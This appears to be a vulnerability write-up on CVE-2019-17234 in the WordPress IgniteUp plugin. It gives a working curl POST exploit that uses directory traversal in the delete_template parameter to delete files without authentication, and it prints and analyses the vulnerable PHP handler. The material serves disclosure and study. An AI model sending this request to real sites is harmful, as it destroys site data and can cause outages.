# Wordpress IgniteUp plugin vulnerability
Wordpress IgniteUp plugin v3.4 and below allows remote unauthenticated users to potentially arbitrarily delete any file on target webserver possibly causing a Denial of Service attack.

# CVE-2019-17234 timeline
The vulnerability was reported to wordpress.org team on September 20, 2019 and new version of the plugin 3.4.1 was released on November 08, 2019.[3]

# Background
IgniteUp is a popular wordpress plugin to perform trivial set up and management of website landing pages to let users know the site is coming soon, in mantainance or under construction.

The plugin comes out of the box with 5 free default templates: **believe,cleaner,glass,launcher,offline**.

Template names are highlighted since a correct parameter [template-name] is required to perform a valid request to the webserver to exploit the vulnerability.

# Exploit code (curl)
**[WARNING]**

Following command example might be enough to break your wordpress website, in this case deleting IgniteUp plugin core files.

```
curl -d "action=admin_init&delete_template=[template-name]/../../" -X POST http(s)://[target-website]/wp-admin/admin-post.php

dummy example:
curl -d "action=admin_init&delete_template=believe/../../" -X POST http://localhost/wp-admin/admin-post.php

```
[NOTE] 
Above command performs directory traversal inside the plugin relative path, with proper permissions (755 to webserver dirs and 644 to webserver files) and chowner (*www-data, apache* user etc...) the attack surface is limited up to server root directory (e.g. */var/www/html*).

# Vulnerability code analysis
The culprit function that introduces this vulnerability is highlighted below, reference file can be found at *wp-content/plugins/igniteup/includes/class-coming-soon-creator.php*, file which, as the name hints, handles creation of new custom templates and deletion of the defaults/created ones.

**V3.4**
```php
add_action('admin_init', array($this, 'deleteTemplate'));
...
...
public function deleteTemplate()
{
   if (!isset($_POST['delete_template']) || empty($_POST['delete_template']))
      return;
   $folder_name = $_POST['delete_template'];
   $path = dirname(CSCS_FILE) . '/includes/templates/';
   array_map('unlink', glob($path . $folder_name . '/*.*'));
   rmdir($path . $folder_name);
   unlink($path . '/' . $folder_name . '.php');
   header('Location: ' . $_SERVER['REQUEST_URI']);
}
```

**admin_init** on the very first line is a Wordpress action hook.
Hooks[2] make up the foundation for how plugins and themes interact with WordPress Core, but they’re also used extensively by Core itself.

Unfortunately the action hook associated function, *deleteTemplate()*, has no administrator/user checks, it gives the reader enough hints on how to perform such action, looking at the code is trivial to spot php POST parameter *delete_template*, this summed up with the admin_init hook action is enough knowledge for trying to perform a POST request to the webserver via the */wp-admin/admin-post.php* interface as pointed out in the exploit code paragraph.



[PERSONAL NOTE] Analayzing the usual behavior of the plugin from a wordpress-adminuser perspective, it is quite strange to find this function (I suppose this is a leftover from earlier versions), that because: 
1) No delete template option is available on v3.4 from admin panel, only plugin activation/deactivation or "creation" (download) of premium ($$$) templates.
2) Code behavior is basically incorrect, the *unlink()* function under normal circumstances will never end up correctly since, in the function parameter building, the '/' between $path and *$folder_name* should not be present, a backslash has already been added in *$path* variable declaration.

Here a sample of what happens during the unlink when I try to DirStroy a template.

[![attack.png](https://i.postimg.cc/4NHvxS1n/attack.png)](https://postimg.cc/nCZ9dTgt)


# TODO
admin-ajax.php test
v3.4.1 comparison


## Authors

* **Andrea Vignudelli** -(https://github.com/administra1tor)


## References
* Kudos to Jerome Bruandet for reporting the issue. 

[source] https://blog.nintechnet.com/multiple-vulnerabilities-in-wordpress-igniteup-coming-soon-and-maintenance-mode-plugin/

[1] v3.4.1 changelog- https://it.wordpress.org/plugins/igniteup/#developers

[2] Wordpress hooks- https://developer.wordpress.org/plugins/hooks/

[3] CVE-2019-17234 NIST reference- https://nvd.nist.gov/vuln/detail/CVE-2019-17234

